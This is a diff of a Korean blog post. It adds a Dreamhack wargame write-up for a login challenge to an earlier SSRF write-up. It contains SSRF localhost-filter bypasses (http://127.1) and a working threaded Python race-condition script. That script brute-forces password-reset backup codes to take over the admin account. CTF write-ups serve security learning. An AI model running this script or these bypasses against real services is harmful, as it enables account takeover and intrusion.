@@ -4,14 +4,15 @@ summary: "dreamhack"
 date: "2026-04-10"
 category: "ctf"
 section: "security"
-badge: "CTF / Wargame"
+badge: "Wargame"
 badgeTone: "ctf"
+ctfGroup: "wargame"
 tags:
-  - ctf
+  - wargame
   - web
 statLabel: "tier"
 statValue: "2"
-heroEyebrow: "$ cat content/posts/web-ssrf.md"
+heroEyebrow: "$ cat content/posts/login1-tier-2.md"
 heroAvatar: "CTF"
 ---
 
@@ -107,7 +108,6 @@ local_server = http.server.HTTPServer(
 ```javascript
 elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
 ```
-### 최종 페이로드
 - 필터링 우회 기법 사용
     - 숏컷 IP : reguests라이브러리는 수자가 생략된 IP 자동 완성함
         - http://127.1 ⇒ 127.0.0.1로 인식
@@ -124,3 +124,68 @@ elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
 - http://Localhost:1545/flag.txt 를 url에 입력하면 이미지가 base64 인코딩 되어 나옴
 ![step1](/images/web-ssrf3.png)
 - 디코딩 하여 플래그 획득
+
+- admin 권한을 가진 user 계정 찾기
+```python
+@app.route('/user/<int:useridx>')
+def users(useridx):
+    conn = get_db()
+    cur = conn.cursor()
+    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
+    
+    if user:
+        return render_template('user.html', user=user)
+
+    return "<script>alert('User Not Found.');history.back(-1);</script>";
+```
+![step1](/images/login1-2.png)
+- Apple 계정의 UserLevel이 1(admin) 인것을 확인
+- 해당 계정에 백업코드(0~99)설정해 100개의 요청을 동시에 보내는 페이로드 작성
+
+```python
+import requests
+import threading
+
+TARGET_URL = "http://host3.dreamhack.games:19336/forgot_password" # 타겟 URL로 변경
+TARGET_USERID = "Apple" # 식별한 관리자 ID
+NEW_PASSWORD = "123"
+
+def send_reset_request(backup_code):
+    data = {
+        "userid": TARGET_USERID,
+        "newpassword": NEW_PASSWORD,
+        "backupCode": backup_code
+    }
+    try:
+        # 응답을 기다리지 않고 일단 던지는 것이 중요합니다.
+        requests.post(TARGET_URL, data=data)
+        print(f"[*] 요청 전송 완료 - backupCode: {backup_code}")
+    except Exception as e:
+        pass
+
+def exploit():
+    threads = []
+    print("[*] Race Condition 공격 시작...")
+    
+    # 0부터 99까지의 백업 코드를 가진 100개의 스레드 생성
+    for code in range(100):
+        t = threading.Thread(target=send_reset_request, args=(code,))
+        threads.append(t)
+        
+    # 모든 스레드를 일제히 시작 (거의 동시에 100개의 요청이 날아감)
+    for t in threads:
+        t.start()
+        
+    # 모든 스레드가 종료될 때까지 대기
+    for t in threads:
+        t.join()
+        
+    print("\n[+] 공격 완료! 타겟 계정으로 로그인을 시도해 보세요.")
+
+if __name__ == "__main__":
+    exploit() # 주석 해제 후 실행
+    pass
+```
+- 해당 코드 실행 시 Apple 계정의 비밀번호가 123로 변경 
+![step1](/images/login1-3.png)
+- admin 엔드포인트 접근 가능 
